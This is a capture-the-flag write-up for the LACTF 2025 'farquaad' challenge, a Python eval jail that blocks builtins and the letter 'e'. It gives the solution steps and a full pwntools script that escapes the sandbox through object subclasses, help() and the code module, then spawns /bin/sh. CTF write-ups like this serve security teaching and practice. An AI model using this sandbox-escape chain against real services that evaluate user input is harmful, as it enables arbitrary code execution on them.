# LACTF 2025 farquaad

```python
#!/usr/local/bin/python3
import string
import html

code = input()

if any(c not in string.printable for c in code):
    print("no tomfoolery!")
    exit()

if "e" in code or "E" in code:
    print("no 'e'!")
    exit()

print(html.escape(repr(eval(code, {"__builtins__": {}}))))
```

Requirements:

1. Only printable characters
2. No `e` or `E`: Use `list(x.__dict__)[index]` to find strings with `e` in it and call it via `x.__dict__[list(x.__dict__)[index]](args)`
3. No builtins: Use `().__class__.__mro__[1].__subclasses__()`

Steps:

1. Find the index of `__subclasses__` in `type.__dict__`
2. Call `().__class__.__mro__[1].__subclasses__()` and find the indices of `<class '_sitebuiltin._Helper'>` and `<class '_sitebuiltin._Printer>` in `().__class__.__mro__[1].__subclasses__()`
3. Enter help() system and load `code` module
4. Find `sys` module via `<class '_sitebuiltin._Printer'>` and call `sys.modules["code"].InteractiveConsole().interact()`

Avoid `e` and `E` by using the `x.__dict__[list(x.__dict__)[index]](args)` trick.

Attack script:

```python
from pwn import *
import html

context(log_level="debug")

# Step 1. Find the index of `__subclasses__` in `type.__dict__`
p = process(["python3", "farquaad.py"])
# find type.__subclasses__
# list(type.__dict__)
# [].__class__: list
# ().__class__.__class__: type
p.sendline(b"[].__class__(().__class__.__class__.__dict__)")
res = p.recvline().decode()
res = html.unescape(res)
subclasses_index = res.split(", ").index("'__subclasses__'")

# Step 2. Call `().__class__.__mro__[1].__subclasses__()`
# and find the indices of `<class '_sitebuiltin._Helper'>` and `<class '_sitebuiltin._Printer>` in `().__class__.__mro__[1].__subclasses__()`
p = process(["python3", "farquaad.py"])
# type.__subclasses__(object)
# type.__subclasses__(().__class__.__mro__[1])
p.sendline(
    (
        "["
        # type
        + "T:=().__class__.__class__,"
        # "__subclasses__"
        + f"S:=[].__class__(T.__dict__)[{subclasses_index}],"
        # type.__subclasses__(object)
        + "T.__dict__[S](().__class__.__mro__[1])"
        + "]"
    ).encode()
)
res = p.recvline().decode()
res = html.unescape(res)

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>") - 2
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>") - 2
print("Helper", helper_index)
print("Printer", printer_index)

# Step 3. Enter help() system and load `code` module
p = process(["python3", "farquaad.py"])
# invoke help()
p.sendline(
    (
        "["
        # type
        + "T:=().__class__.__class__,"
        # "__subclasses__"
        + f"S:=[].__class__(T.__dict__)[{subclasses_index}],"
        # type.__subclasses__(object)[helper_index]()()
        + f"T.__dict__[S](().__class__.__mro__[1])[{helper_index}]()()"
        + "]"
    ).encode()
)
p.recvuntil(b"help> ")
p.sendline(b"code")
p.recvuntil(b"help> ")
# return to farquaad
p.sendline(b"farquaad")

# Step 4. Find `sys` module via `<class '_sitebuiltin._Printer'>`
# and call `sys.modules["code"].InteractiveConsole().interact()`

# launch code.InteractiveConsole().interact()
p.sendline(
    (
        "["
        # type
        + "T:=().__class__.__class__,"
        # "__subclasses__"
        + f"S:=[].__class__(T.__dict__)[{subclasses_index}],"
        # type.__subclasses__(object)[printer_index].__init__.__globals__["sys"]
        + f"sys:=T.__dict__[S](().__class__.__mro__[1])[{printer_index}].__init__.__globals__['sys'],"
        # "modules"
        + "M:=[x for x in sys.__dict__ if x.startswith('modul')][0],"
        # "code"
        + "C:=[x for x in sys.__dict__[M] if x.startswith('cod')][-1],"
        # code module
        + "c:=sys.__dict__[M][C],"
        # "InteractiveConsole"
        + "I:=[x for x in c.__dict__ if 'Consol' in x][0],"
        # "interact"
        + "i:=[x for x in c.__dict__[I].__dict__ if 'ract' in x][0],"
        # code.InteractiveConsole.interact(code.InteractiveConsole())
        + "c.__dict__[I].__dict__[i](c.__dict__[I]()),"
        + "]"
    ).encode()
)
# in interactive shell
p.recvuntil(b">>> ")
p.sendline(b"import os")
p.sendline(b'os.system("/bin/sh")')
p.interactive()
```
